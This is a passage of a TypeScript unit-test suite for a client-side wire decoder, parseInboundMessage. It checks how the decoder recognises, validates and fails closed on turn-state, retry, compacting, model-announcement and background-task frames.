    expect(parseInboundMessage(encodeMessage(MSG))).toEqual({ kind: 'message', message: MSG })
  })
})

describe('parseInboundMessage — turn_state fail-closed (#214)', () => {
  it('throws when state is absent, a non-string, or a string outside the closed enum', () => {
    const bad: unknown[] = [
      { conversation_id: 'conv-1' }, // state absent
      { ...TURN_STATE, state: 42 }, // non-string
      { ...TURN_STATE, state: null },
      { ...TURN_STATE, state: {} },
      { ...TURN_STATE, state: 'done' }, // a string outside the closed enum
      { ...TURN_STATE, state: '' } // empty string is still outside the enum
    ]
    for (const payload of bad) {
      expect(() => parseInboundMessage(encodeTurnState(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws when conversation_id is absent or a non-string', () => {
    const bad: unknown[] = [
      { state: 'thinking' }, // conversation_id absent
      { ...TURN_STATE, conversation_id: 42 },
      { ...TURN_STATE, conversation_id: null }
    ]
    for (const payload of bad) {
      expect(() => parseInboundMessage(encodeTurnState(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws when a turn_state payload is not an object', () => {
    expect(() => parseInboundMessage(encodeTurnState('nope'))).toThrow(WireDecodeError)
    expect(() => parseInboundMessage(encodeTurnState(['a']))).toThrow(WireDecodeError)
  })
})

describe('parseInboundMessage — stall recognition (#315, additive)', () => {
  it('narrows a full stall into { kind: stall } carrying only conversation_id', () => {
    expect(parseInboundMessage(encodeStall(STALL))).toEqual({
      kind: 'stall',
      stall: STALL
    })
  })

  it('drops unknown server keys, keeping only the one known stall field (forward-compat)', () => {
    const withExtras = { ...STALL, turn_id: 'turn-1', extra: 'ignore-me' }
    expect(parseInboundMessage(encodeStall(withExtras))).toEqual({
      kind: 'stall',
      stall: STALL
    })
  })

  it('still routes a message to its existing kind (additive, unchanged)', () => {
    expect(parseInboundMessage(encodeMessage(MSG))).toEqual({ kind: 'message', message: MSG })
  })

  it('still returns null for a well-formed envelope of another unmodeled type (no widening)', () => {
    const bytes = encodeEnvelope({ id: 1, type: 'ack', ts: FIXED_TS, payload: {} })
    expect(parseInboundMessage(bytes)).toBeNull()
  })
})

describe('parseInboundMessage — stall fail-closed (#315)', () => {
  it('throws when conversation_id is absent, a non-string, or null', () => {
    const bad: unknown[] = [
      {}, // conversation_id absent
      { conversation_id: 42 }, // non-string
      { conversation_id: null }
    ]
    for (const payload of bad) {
      expect(() => parseInboundMessage(encodeStall(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws when a stall payload is not an object', () => {
    expect(() => parseInboundMessage(encodeStall('nope'))).toThrow(WireDecodeError)
    expect(() => parseInboundMessage(encodeStall(['a']))).toThrow(WireDecodeError)
  })
})

describe('parseInboundMessage — api_retry recognition (#492, additive)', () => {
  it('narrows a full rising-edge api_retry into { kind: api-retry } carrying all four fields', () => {
    expect(parseInboundMessage(encodeApiRetry(API_RETRY))).toEqual({
      kind: 'api-retry',
      apiRetry: API_RETRY
    })
  })

  it('decodes 0/0 — the legitimate "retrying, count unknown" state, neither a failure nor coerced', () => {
    const unknownCount = { ...API_RETRY, current: 0, total: 0 }
    expect(parseInboundMessage(encodeApiRetry(unknownCount))).toEqual({
      kind: 'api-retry',
      apiRetry: unknownCount
    })
  })

  it('decodes the falling edge — active false is a VALUE, not an absence (counter repeated)', () => {
    const falling = { ...API_RETRY, active: false }
    const decoded = parseInboundMessage(encodeApiRetry(falling))
    expect(decoded).toEqual({ kind: 'api-retry', apiRetry: falling })
  })

  it('drops unknown server keys, keeping exactly the four known fields (forward-compat)', () => {
    const withExtras = { ...API_RETRY, turn_id: 'turn-1', extra: 'ignore-me' }
    expect(parseInboundMessage(encodeApiRetry(withExtras))).toEqual({
      kind: 'api-retry',
      apiRetry: API_RETRY
    })
  })

  it('still returns null for a well-formed envelope of another unmodeled type (no widening)', () => {
    const bytes = encodeEnvelope({ id: 1, type: 'ack', ts: FIXED_TS, payload: {} })
    expect(parseInboundMessage(bytes)).toBeNull()
  })
})

describe('parseInboundMessage — api_retry fail-closed (#492)', () => {
  it('throws when conversation_id is absent, a non-string, or null', () => {
    const bad: unknown[] = [
      { active: true, current: 3, total: 10 }, // absent
      { ...API_RETRY, conversation_id: 42 },
      { ...API_RETRY, conversation_id: null }
    ]
    for (const payload of bad) {
      expect(() => parseInboundMessage(encodeApiRetry(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws when active is absent or a non-boolean (TYPE-checked, never truthiness)', () => {
    const bad: unknown[] = [
      { conversation_id: 'c1', current: 3, total: 10 }, // absent
      { ...API_RETRY, active: 'true' },
      { ...API_RETRY, active: 1 },
      { ...API_RETRY, active: 0 },
      { ...API_RETRY, active: null }
    ]
    for (const payload of bad) {
      expect(() => parseInboundMessage(encodeApiRetry(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws when current is absent or a non-number', () => {
    const bad: unknown[] = [
      { conversation_id: 'c1', active: true, total: 10 }, // absent
      { ...API_RETRY, current: '3' },
      { ...API_RETRY, current: null }
    ]
    for (const payload of bad) {
      expect(() => parseInboundMessage(encodeApiRetry(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws when total is absent or a non-number', () => {
    const bad: unknown[] = [
      { conversation_id: 'c1', active: true, current: 3 }, // absent
      { ...API_RETRY, total: '10' },
      { ...API_RETRY, total: null }
    ]
    for (const payload of bad) {
      expect(() => parseInboundMessage(encodeApiRetry(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws when an api_retry payload is not an object', () => {
    expect(() => parseInboundMessage(encodeApiRetry('nope'))).toThrow(WireDecodeError)
    expect(() => parseInboundMessage(encodeApiRetry(['a']))).toThrow(WireDecodeError)
  })
})

describe('parseInboundMessage — compacting recognition (#495, additive)', () => {
  it('narrows a rising-edge compacting into { kind: compacting } carrying both fields', () => {
    expect(parseInboundMessage(encodeCompacting(COMPACTING))).toEqual({
      kind: 'compacting',
      compacting: COMPACTING
    })
  })

  it('decodes the falling edge — active false is a VALUE, not an absence', () => {
    const falling = { ...COMPACTING, active: false }
    expect(parseInboundMessage(encodeCompacting(falling))).toEqual({
      kind: 'compacting',
      compacting: falling
    })
  })

  it('drops unknown server keys, keeping exactly the two known fields (forward-compat)', () => {
    const withExtras = { ...COMPACTING, turn_id: 'turn-1', extra: 'ignore-me' }
    expect(parseInboundMessage(encodeCompacting(withExtras))).toEqual({
      kind: 'compacting',
      compacting: COMPACTING
    })
  })

  it('still returns null for a well-formed envelope of another unmodeled type (no widening)', () => {
    const bytes = encodeEnvelope({ id: 1, type: 'ack', ts: FIXED_TS, payload: {} })
    expect(parseInboundMessage(bytes)).toBeNull()
  })
})

describe('parseInboundMessage — compacting fail-closed (#495)', () => {
  it('throws when conversation_id is absent, a non-string, or null', () => {
    const bad: unknown[] = [
      { active: true }, // absent
      { ...COMPACTING, conversation_id: 42 },
      { ...COMPACTING, conversation_id: null }
    ]
    for (const payload of bad) {
      expect(() => parseInboundMessage(encodeCompacting(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws when active is absent or a non-boolean (TYPE-checked, never truthiness)', () => {
    const bad: unknown[] = [
      { conversation_id: 'c1' }, // absent
      { ...COMPACTING, active: 'true' },
      { ...COMPACTING, active: 1 },
      { ...COMPACTING, active: 0 },
      { ...COMPACTING, active: null }
    ]
    for (const payload of bad) {
      expect(() => parseInboundMessage(encodeCompacting(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws when a compacting payload is not an object', () => {
    expect(() => parseInboundMessage(encodeCompacting('nope'))).toThrow(WireDecodeError)
    expect(() => parseInboundMessage(encodeCompacting(['a']))).toThrow(WireDecodeError)
  })
})

describe('parseInboundMessage — model_announced recognition (#587, additive)', () => {
  // AC3's assertion discipline: every expectation below is a SPELLED-OUT literal, never the fixture
  // object reused as its own expectation — a fixture on both sides would pass a decoder that re-cased
  // or substituted the value it was handed.
  it('narrows a well-formed model_announced into { kind: model-announced } carrying all three fields', () => {
    expect(parseInboundMessage(encodeModelAnnounced(MODEL_ANNOUNCED))).toEqual({
      kind: 'model-announced',
      modelAnnounced: {
        conversation_id: 'c1',
        model: 'claude-haiku-4-5-20251001',
        truncated: true
      }
    })
  })

  it('carries the identifier BYTE-FOR-BYTE — no lowercasing, no trimming, no family match', () => {
    // A deliberately conspicuous sentinel: mixed case, an underscore, a dot and a digit run that no
    // normaliser would leave alone. This is the assertion a decoder that "tidies" the value fails.
    const sentinel = 'Claude-Opus-5_TEST.20260819'
    const decoded = parseInboundMessage(
      encodeModelAnnounced({ ...MODEL_ANNOUNCED, model: sentinel })
    )
    expect(decoded).toEqual({
      kind: 'model-announced',
      modelAnnounced: {
        conversation_id: 'c1',
        model: 'Claude-Opus-5_TEST.20260819',
        truncated: true
      }
    })
  })

  it('decodes an identifier in no published list exactly like any other (AC1 — no allow-list)', () => {
    // Requesting `claude-haiku-4-5` yields it back UNDATED, which appears in no published list; an
    // outright invented one is no different here. A lookup miss is ORDINARY, not a decode failure.
    expect(
      parseInboundMessage(encodeModelAnnounced({ ...MODEL_ANNOUNCED, model: 'claude-haiku-4-5' }))
    ).toEqual({
      kind: 'model-announced',
      modelAnnounced: { conversation_id: 'c1', model: 'claude-haiku-4-5', truncated: true }
    })
    expect(
      parseInboundMessage(
        encodeModelAnnounced({ ...MODEL_ANNOUNCED, model: 'totally-made-up-model-9' })
      )
    ).toEqual({
      kind: 'model-announced',
      modelAnnounced: { conversation_id: 'c1', model: 'totally-made-up-model-9', truncated: true }
    })
  })

  it('round-trips truncated in both directions — the cut report reaches the caller unchanged', () => {
    const cut = parseInboundMessage(encodeModelAnnounced({ ...MODEL_ANNOUNCED, truncated: true }))
    expect(cut).toEqual({
      kind: 'model-announced',
      modelAnnounced: { conversation_id: 'c1', model: 'claude-haiku-4-5-20251001', truncated: true }
    })
    const whole = parseInboundMessage(encodeModelAnnounced({ ...MODEL_ANNOUNCED, truncated: false }))
    expect(whole).toEqual({
      kind: 'model-announced',
      modelAnnounced: { conversation_id: 'c1', model: 'claude-haiku-4-5-20251001', truncated: false }
    })
  })

  it('decodes an EMPTY model — the producer suppresses it, but the decoder must not (no guard)', () => {
    expect(
      parseInboundMessage(encodeModelAnnounced({ ...MODEL_ANNOUNCED, model: '', truncated: false }))
    ).toEqual({
      kind: 'model-announced',
      modelAnnounced: { conversation_id: 'c1', model: '', truncated: false }
    })
  })

  it('drops unknown server keys, keeping exactly the three known fields (forward-compat)', () => {
    const withExtras = { ...MODEL_ANNOUNCED, turn_id: 'turn-1', extra: 'ignore-me' }
    expect(parseInboundMessage(encodeModelAnnounced(withExtras))).toEqual({
      kind: 'model-announced',
      modelAnnounced: {
        conversation_id: 'c1',
        model: 'claude-haiku-4-5-20251001',
        truncated: true
      }
    })
  })

  it('still returns null for a well-formed envelope of another unmodeled type (no widening)', () => {
    const bytes = encodeEnvelope({ id: 1, type: 'ack', ts: FIXED_TS, payload: {} })
    expect(parseInboundMessage(bytes)).toBeNull()
  })
})

describe('parseInboundMessage — model_announced fail-closed (#587)', () => {
  it('throws when model is absent or a non-string (AC4 — never a defaulted value)', () => {
    const bad: unknown[] = [
      { conversation_id: 'c1', truncated: true }, // absent
      { ...MODEL_ANNOUNCED, model: 42 },
      { ...MODEL_ANNOUNCED, model: null },
      { ...MODEL_ANNOUNCED, model: { name: 'claude-opus-5' } },
      { ...MODEL_ANNOUNCED, model: ['claude-opus-5'] }
    ]
    for (const payload of bad) {
      expect(() => parseInboundMessage(encodeModelAnnounced(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws when truncated is absent or a non-boolean (TYPE-checked, never defaulted to "not cut")', () => {
    // The `0` and `'true'` cases are the ones that matter: they are exactly what an implementation
    // that defaulted a missing/loose `truncated` to false would silently swallow, presenting a cut
    // identifier as a complete one.
    const bad: unknown[] = [
      { conversation_id: 'c1', model: 'claude-haiku-4-5-20251001' }, // absent
      { ...MODEL_ANNOUNCED, truncated: 'true' },
      { ...MODEL_ANNOUNCED, truncated: 'false' },
      { ...MODEL_ANNOUNCED, truncated: 0 },
      { ...MODEL_ANNOUNCED, truncated: 1 },
      { ...MODEL_ANNOUNCED, truncated: null }
    ]
    for (const payload of bad) {
      expect(() => parseInboundMessage(encodeModelAnnounced(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws when conversation_id is absent, a non-string, or null', () => {
    const bad: unknown[] = [
      { model: 'claude-haiku-4-5-20251001', truncated: true }, // absent
      { ...MODEL_ANNOUNCED, conversation_id: 42 },
      { ...MODEL_ANNOUNCED, conversation_id: null }
    ]
    for (const payload of bad) {
      expect(() => parseInboundMessage(encodeModelAnnounced(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws when a model_announced payload is not an object', () => {
    expect(() => parseInboundMessage(encodeModelAnnounced('nope'))).toThrow(WireDecodeError)
    expect(() => parseInboundMessage(encodeModelAnnounced(['a']))).toThrow(WireDecodeError)
    expect(() => parseInboundMessage(encodeModelAnnounced(null))).toThrow(WireDecodeError)
  })
})

describe('parseInboundMessage — background_task_started recognition (#564, additive)', () => {
  it('narrows a full frame into { kind: background-task-started } carrying all six fields', () => {
    // Every fixture field is distinct and non-empty (AC1), so a swap or a drop fails this assertion.
    expect(parseInboundMessage(encodeBackgroundTaskStarted(BACKGROUND_TASK_STARTED))).toEqual({
      kind: 'background-task-started',
      backgroundTaskStarted: BACKGROUND_TASK_STARTED
    })
  })

  it('preserves truncated_fields null as "nothing was cut", never collapsing it to [] (AC2)', () => {
    const nothingCut = { ...BACKGROUND_TASK_STARTED, truncated_fields: null }
    const decoded = parseInboundMessage(encodeBackgroundTaskStarted(nothingCut))
    expect(decoded).toEqual({ kind: 'background-task-started', backgroundTaskStarted: nothingCut })
    // Pinned explicitly: null is a VALUE distinct from the empty list, never a truthiness question.
    expect(
      (decoded as { backgroundTaskStarted: { truncated_fields: unknown } }).backgroundTaskStarted
        .truncated_fields
    ).toBeNull()
  })

  it('decodes an EMPTY truncated_fields list — valid, and distinct from null (AC2)', () => {
    const emptyList = { ...BACKGROUND_TASK_STARTED, truncated_fields: [] }
    const decoded = parseInboundMessage(encodeBackgroundTaskStarted(emptyList))
    expect(decoded).toEqual({ kind: 'background-task-started', backgroundTaskStarted: emptyList })
    expect(
      (decoded as { backgroundTaskStarted: { truncated_fields: unknown } }).backgroundTaskStarted
        .truncated_fields
    ).toEqual([])
  })

  it('round-trips a multi-element truncated_fields list in wire order', () => {
    const twoCut = { ...BACKGROUND_TASK_STARTED, truncated_fields: ['description', 'task_type'] }
    expect(parseInboundMessage(encodeBackgroundTaskStarted(twoCut))).toEqual({
      kind: 'background-task-started',
      backgroundTaskStarted: twoCut
    })
  })

  it('decodes an empty-string task_type — the checks are on the TYPE, never truthiness', () => {
    const emptyType = { ...BACKGROUND_TASK_STARTED, task_type: '' }
    expect(parseInboundMessage(encodeBackgroundTaskStarted(emptyType))).toEqual({
      kind: 'background-task-started',
      backgroundTaskStarted: emptyType
    })
  })

  it('does NOT narrow task_type to a closed set — an unobserved kind decodes (no client-side enum)', () => {
    const otherKind = { ...BACKGROUND_TASK_STARTED, task_type: 'some_future_kind' }
    expect(parseInboundMessage(encodeBackgroundTaskStarted(otherKind))).toEqual({
      kind: 'background-task-started',
      backgroundTaskStarted: otherKind
    })
  })

  it('drops unknown server keys, keeping exactly the six known fields (AC4, forward-compat)', () => {
    // `turn_id` is the pointed extra: this frame must never have one, and it must not ride through.
    const withExtras = { ...BACKGROUND_TASK_STARTED, turn_id: 'turn-1', extra: 'ignore-me' }
    expect(parseInboundMessage(encodeBackgroundTaskStarted(withExtras))).toEqual({
      kind: 'background-task-started',
      backgroundTaskStarted: BACKGROUND_TASK_STARTED
    })
  })

  it('still returns null for a well-formed envelope of another unmodeled type (no widening)', () => {
    const bytes = encodeEnvelope({ id: 1, type: 'ack', ts: FIXED_TS, payload: {} })
    expect(parseInboundMessage(bytes)).toBeNull()
  })
})

describe('parseInboundMessage — background_task_started fail-closed (#564)', () => {
  const strings = ['conversation_id', 'task_id', 'tool_call_id', 'description', 'task_type'] as const

  it('throws when any of the five required strings is absent (AC3)', () => {
    for (const field of strings) {
      const payload: Record<string, unknown> = { ...BACKGROUND_TASK_STARTED }
      delete payload[field]
      expect(() => parseInboundMessage(encodeBackgroundTaskStarted(payload))).toThrow(
        WireDecodeError
      )
    }
  })

  it('throws when any of the five required strings is a non-string (AC3)', () => {
    for (const field of strings) {
      for (const value of [42, null, { a: 1 }]) {
        const payload = { ...BACKGROUND_TASK_STARTED, [field]: value }
        expect(() => parseInboundMessage(encodeBackgroundTaskStarted(payload))).toThrow(
          WireDecodeError
        )
      }
    }
  })

  it('throws when the truncated_fields key is OMITTED — an absence is not a null (AC2)', () => {
    // The Go struct has no `omitempty`, so the key is always on the wire; a missing key is a
    // malformed frame, and this is the test that separates a required-nullable parse from an
    // optional one.
    const payload: Record<string, unknown> = { ...BACKGROUND_TASK_STARTED }
    delete payload.truncated_fields
    expect(() => parseInboundMessage(encodeBackgroundTaskStarted(payload))).toThrow(WireDecodeError)
  })

  it('throws when truncated_fields is neither an array nor null (AC3)', () => {
    const bad: unknown[] = ['description', 7, { description: true }, true]
    for (const value of bad) {
      const payload = { ...BACKGROUND_TASK_STARTED, truncated_fields: value }
      expect(() => parseInboundMessage(encodeBackgroundTaskStarted(payload))).toThrow(
        WireDecodeError
      )
    }
  })

  it('throws when truncated_fields holds a non-string element — one bad element fails the whole payload closed', () => {
    const bad: unknown[] = [['description', 7], [null], [{ name: 'description' }], [['nested']]]
    for (const value of bad) {
      const payload = { ...BACKGROUND_TASK_STARTED, truncated_fields: value }
      expect(() => parseInboundMessage(encodeBackgroundTaskStarted(payload))).toThrow(
        WireDecodeError
      )
    }
  })

  it('throws when a background_task_started payload is not an object (AC3)', () => {
    expect(() => parseInboundMessage(encodeBackgroundTaskStarted('nope'))).toThrow(WireDecodeError)
    expect(() => parseInboundMessage(encodeBackgroundTaskStarted(['a']))).toThrow(WireDecodeError)
  })
})

describe('parseInboundMessage — background_task_updated recognition (#565, additive)', () => {
  it('narrows a full frame into { kind: background-task-updated } carrying all four fields (AC1)', () => {
    // Every fixture field is distinct and non-empty, so a swap or a drop fails this assertion.
    expect(parseInboundMessage(encodeBackgroundTaskUpdated(BACKGROUND_TASK_UPDATED))).toEqual({
      kind: 'background-task-updated',
      backgroundTaskUpdated: BACKGROUND_TASK_UPDATED
    })
  })

  it('carries a patch that is NOT VALID JSON, byte-for-byte — nothing on this path parses it (AC2)', () => {
    // The canonical fixture's patch is cut mid-token by the daemon (maxTaskPatch), so a truncated
    // object is no longer valid JSON. This test is the pin against a future "let's parse the patch"
    // change: there is NO JSON.parse anywhere on this decode path, and any consumer that wants the
    // keys must do so behind an error branch that falls back to rendering it as text.
    expect(() => JSON.parse(BACKGROUND_TASK_UPDATED.patch)).toThrow()
    const decoded = parseInboundMessage(encodeBackgroundTaskUpdated(BACKGROUND_TASK_UPDATED))
    expect(
      (decoded as { backgroundTaskUpdated: { patch: unknown } }).backgroundTaskUpdated.patch
    ).toBe('{"is_backgrounded":tr')
  })

  it('decodes an EMPTY patch as "" — claude sent no change, never a missing field (AC2)', () => {
    // requireString checks the TYPE, so '' passes free (the requireBoolean `false` posture). Invisible
    // in the code, hence pinned here: a later "hardening" to a .length or truthiness check would
    // silently break a valid frame.
    const noChange = { ...BACKGROUND_TASK_UPDATED, patch: '' }
    const decoded = parseInboundMessage(encodeBackgroundTaskUpdated(noChange))
    expect(decoded).toEqual({ kind: 'background-task-updated', backgroundTaskUpdated: noChange })
    expect(
      (decoded as { backgroundTaskUpdated: { patch: unknown } }).backgroundTaskUpdated.patch
    ).toBe('')
  })

  it('preserves truncated_fields null as "nothing was cut", never collapsing it to [] (AC3)', () => {
    const nothingCut = { ...BACKGROUND_TASK_UPDATED, truncated_fields: null }
    const decoded = parseInboundMessage(encodeBackgroundTaskUpdated(nothingCut))
    expect(decoded).toEqual({ kind: 'background-task-updated', backgroundTaskUpdated: nothingCut })
    // Pinned explicitly: null is a VALUE distinct from the empty list, never a truthiness question.
    expect(
      (decoded as { backgroundTaskUpdated: { truncated_fields: unknown } }).backgroundTaskUpdated
        .truncated_fields
    ).toBeNull()
  })

  it('decodes an EMPTY truncated_fields list — valid, and distinct from null (AC3)', () => {
    const emptyList = { ...BACKGROUND_TASK_UPDATED, truncated_fields: [] }
    const decoded = parseInboundMessage(encodeBackgroundTaskUpdated(emptyList))
    expect(decoded).toEqual({ kind: 'background-task-updated', backgroundTaskUpdated: emptyList })
    expect(
      (decoded as { backgroundTaskUpdated: { truncated_fields: unknown } }).backgroundTaskUpdated
        .truncated_fields
    ).toEqual([])
  })

  it('round-trips the multi-element truncated_fields pair of this frame, in wire order (AC3)', () => {
    // `task_id`, `patch` — a DIFFERENT pair from the sibling's four, which is itself the argument
    // against ever narrowing the element vocabulary to a client-side union.
    const bothCut = { ...BACKGROUND_TASK_UPDATED, truncated_fields: ['task_id', 'patch'] }
    expect(parseInboundMessage(encodeBackgroundTaskUpdated(bothCut))).toEqual({
      kind: 'background-task-updated',
      backgroundTaskUpdated: bothCut
    })
  })

  it('does NOT narrow the truncated_fields elements to a closed set (no client-side allowlist)', () => {
    const futureName = { ...BACKGROUND_TASK_UPDATED, truncated_fields: ['some_future_field'] }
    expect(parseInboundMessage(encodeBackgroundTaskUpdated(futureName))).toEqual({
      kind: 'background-task-updated',
      backgroundTaskUpdated: futureName
    })
  })

  it('drops unknown server keys, keeping exactly the four known fields (AC4, forward-compat)', () => {
    // The pointed extras are the SIBLING's three fields, which this frame must never have and must
    // not ride through — the regression test for the cloning trap — plus a spurious `turn_id`.
    const withExtras = {
      ...BACKGROUND_TASK_UPDATED,
      tool_call_id: 'toolu_01XYZ',
      description: 'sleep 60',
      task_type: 'local_bash',
      turn_id: 'turn-1'
    }
    expect(parseInboundMessage(encodeBackgroundTaskUpdated(withExtras))).toEqual({
      kind: 'background-task-updated',
      backgroundTaskUpdated: BACKGROUND_TASK_UPDATED
    })
  })

  it('still returns null for a well-formed envelope of another unmodeled type (no widening)', () => {
    const bytes = encodeEnvelope({ id: 1, type: 'ack', ts: FIXED_TS, payload: {} })
    expect(parseInboundMessage(bytes)).toBeNull()
  })
})

describe('parseInboundMessage — background_task_updated fail-closed (#565)', () => {
  const strings = ['conversation_id', 'task_id', 'patch'] as const

  it('throws when any of the three required strings is absent (AC4)', () => {
    for (const field of strings) {
      const payload: Record<string, unknown> = { ...BACKGROUND_TASK_UPDATED }
      delete payload[field]
      expect(() => parseInboundMessage(encodeBackgroundTaskUpdated(payload))).toThrow(
        WireDecodeError
      )
    }
  })

  it('throws when any of the three required strings is a non-string (AC4)', () => {
    for (const field of strings) {
      for (const value of [42, null, { a: 1 }]) {
        const payload = { ...BACKGROUND_TASK_UPDATED, [field]: value }
        expect(() => parseInboundMessage(encodeBackgroundTaskUpdated(payload))).toThrow(
          WireDecodeError
        )
      }
    }
  })

  it('throws when the patch key is OMITTED — an absence is not an empty patch (AC2/AC4)', () => {
    // Paired with the `patch: ''` case above, this is what distinguishes required-may-be-empty from
    // optional: the Go field has no `omitempty`, so the key is always on the wire.
    const payload: Record<string, unknown> = { ...BACKGROUND_TASK_UPDATED }
    delete payload.patch
    expect(() => parseInboundMessage(encodeBackgroundTaskUpdated(payload))).toThrow(WireDecodeError)
  })

  it('throws when the truncated_fields key is OMITTED — an absence is not a null (AC3)', () => {
    const payload: Record<string, unknown> = { ...BACKGROUND_TASK_UPDATED }
    delete payload.truncated_fields
    expect(() => parseInboundMessage(encodeBackgroundTaskUpdated(payload))).toThrow(WireDecodeError)
  })

  it('throws when truncated_fields is neither an array nor null (AC4)', () => {
    const bad: unknown[] = ['patch', 7, { patch: true }, true]
    for (const value of bad) {
      const payload = { ...BACKGROUND_TASK_UPDATED, truncated_fields: value }
      expect(() => parseInboundMessage(encodeBackgroundTaskUpdated(payload))).toThrow(
        WireDecodeError
      )
    }
  })

  it('throws when truncated_fields holds a non-string element — one bad element fails the whole payload closed', () => {
    const bad: unknown[] = [['patch', 7], [null], [{ name: 'patch' }], [['nested']]]
    for (const value of bad) {
      const payload = { ...BACKGROUND_TASK_UPDATED, truncated_fields: value }
      expect(() => parseInboundMessage(encodeBackgroundTaskUpdated(payload))).toThrow(
        WireDecodeError
      )
    }
  })

  it('throws when a background_task_updated payload is not an object (AC4)', () => {
    expect(() => parseInboundMessage(encodeBackgroundTaskUpdated('nope'))).toThrow(WireDecodeError)
    expect(() => parseInboundMessage(encodeBackgroundTaskUpdated(['a']))).toThrow(WireDecodeError)
  })
})

describe('parseInboundMessage — background_task_roster recognition (#566, additive)', () => {
  it('narrows a full frame into { kind: background-task-roster } carrying all three fields (AC1)', () => {
    expect(parseInboundMessage(encodeBackgroundTaskRoster(BACKGROUND_TASK_ROSTER))).toEqual({
      kind: 'background-task-roster',
      backgroundTaskRoster: BACKGROUND_TASK_ROSTER
    })
  })

  it('extracts every field on every row distinctly, in wire order (AC1)', () => {
    // The core AC1 assertion, per-field across the rows (the queue_state per-row extraction idiom): a
    // ROW SWAP fails the ordered arrays, a DROPPED FIELD fails its own array, and a FLATTENED
    // truncated_fields fails the last one — which is exactly why the fixture's two rows carry
    // DIFFERENT truncated_fields shapes.
    const result = parseInboundMessage(encodeBackgroundTaskRoster(BACKGROUND_TASK_ROSTER))
    expect(result?.kind).toBe('background-task-roster')
    if (result?.kind === 'background-task-roster') {
      const { backgroundTaskRoster: roster } = result
      expect(roster.conversation_id).toBe('c1')
      expect(roster.tasks.map((t) => t.task_id)).toEqual(['task_01ABC', 'task_02DEF'])
      expect(roster.tasks.map((t) => t.task_type)).toEqual(['local_bash', 'local_bash'])
      expect(roster.tasks.map((t) => t.description)).toEqual(["grep -rn 'a<b&c' .", 'sleep 300'])
      // Per-row and NOT hoisted: row 1's own list, row 2's own null. A merged or flattened list fails
      // both halves.
      expect(roster.tasks[0].truncated_fields).toEqual(['description'])
      expect(roster.tasks[1].truncated_fields).toBeNull()
      // dropped_tasks decodes as a NUMBER, never a string.
      expect(roster.dropped_tasks).toBe(3)
      expect(typeof roster.dropped_tasks).toBe('number')
    }
  })

  it('carries the metacharacter-bearing description byte-for-byte — nothing escapes it', () => {
    // The daemon's fixture ships `a<b&c` on purpose. This is the pin against a future
    // "sanitize/normalize at the decoder" change: escaping here would corrupt a display blob and
    // present altered text as claude's, and would break on the daemon's own canonical fixture. The
    // defence belongs at the render sink (#568), not the wire.
    const result = parseInboundMessage(encodeBackgroundTaskRoster(BACKGROUND_TASK_ROSTER))
    if (result?.kind === 'background-task-roster') {
      expect(result.backgroundTaskRoster.tasks[0].description).toBe("grep -rn 'a<b&c' .")
    }
  })

  it('decodes an EMPTY tasks array — "roster observed, nothing alive", never dropped (AC2)', () => {
    // The AC2 signal case, and what it DISTINGUISHES: this decodes to a value, so a consumer can tell
    // "a roster arrived and nothing is running" (below) from "no roster was observed at all" (the
    // `null` an unmodeled type returns, asserted in the regression test at the end of this block).
    const decoded = parseInboundMessage(encodeBackgroundTaskRoster(BACKGROUND_TASK_ROSTER_EMPTY))
    expect(decoded).not.toBeNull()
    expect(decoded).toEqual({
      kind: 'background-task-roster',
      backgroundTaskRoster: BACKGROUND_TASK_ROSTER_EMPTY
    })
    if (decoded?.kind === 'background-task-roster') {
      expect(decoded.backgroundTaskRoster.tasks).toEqual([])
    }
  })

  it('carries dropped_tasks 0 as the VALUE 0, never consulting truthiness (AC3)', () => {
    const decoded = parseInboundMessage(encodeBackgroundTaskRoster(BACKGROUND_TASK_ROSTER_EMPTY))
    if (decoded?.kind === 'background-task-roster') {
      // toBe(0), not a truthiness check: requireNumber admits 0 free, and the Go field has no
      // `omitempty`, so 0 is genuinely written on the wire.
      expect(decoded.backgroundTaskRoster.dropped_tasks).toBe(0)
    }
  })

  it('decodes a row truncated_fields of [] — valid, and distinct from null (AC1)', () => {
    const emptyList = {
      ...BACKGROUND_TASK_ROSTER,
      tasks: [{ ...BACKGROUND_TASK_ROSTER.tasks[0], truncated_fields: [] }]
    }
    const decoded = parseInboundMessage(encodeBackgroundTaskRoster(emptyList))
    expect(decoded).toEqual({ kind: 'background-task-roster', backgroundTaskRoster: emptyList })
    if (decoded?.kind === 'background-task-roster') {
      expect(decoded.backgroundTaskRoster.tasks[0].truncated_fields).toEqual([])
    }
  })

  it('round-trips this row\'s multi-element truncated_fields set, in wire order', () => {
    // `task_id`, `task_type`, `description` — a THIRD distinct set from #564's and #565's, which is
    // itself the argument against ever narrowing the element vocabulary to a client-side union.
    const allCut = {
      ...BACKGROUND_TASK_ROSTER,
      tasks: [
        {
          ...BACKGROUND_TASK_ROSTER.tasks[0],
          truncated_fields: ['task_id', 'task_type', 'description']
        }
      ]
    }
    expect(parseInboundMessage(encodeBackgroundTaskRoster(allCut))).toEqual({
      kind: 'background-task-roster',
      backgroundTaskRoster: allCut
    })
  })

  it('does NOT narrow the row truncated_fields elements to a closed set (no client-side allowlist)', () => {
    const futureName = {
      ...BACKGROUND_TASK_ROSTER,
      tasks: [{ ...BACKGROUND_TASK_ROSTER.tasks[0], truncated_fields: ['some_future_field'] }]
    }
    expect(parseInboundMessage(encodeBackgroundTaskRoster(futureName))).toEqual({
      kind: 'background-task-roster',
      backgroundTaskRoster: futureName
    })
  })

  it('does NOT narrow task_type to a closed set — local_bash is one observation, not an enum', () => {
    const futureType = {
      ...BACKGROUND_TASK_ROSTER,
      tasks: [{ ...BACKGROUND_TASK_ROSTER.tasks[0], task_type: 'some_future_kind' }]
    }
    expect(parseInboundMessage(encodeBackgroundTaskRoster(futureType))).toEqual({
      kind: 'background-task-roster',
      backgroundTaskRoster: futureType
    })
  })

  it('drops unknown server keys at the FRAME level, keeping exactly the three known fields (AC4)', () => {
    // The pointed extra is `truncated_fields` — the field this frame deliberately does NOT have at the
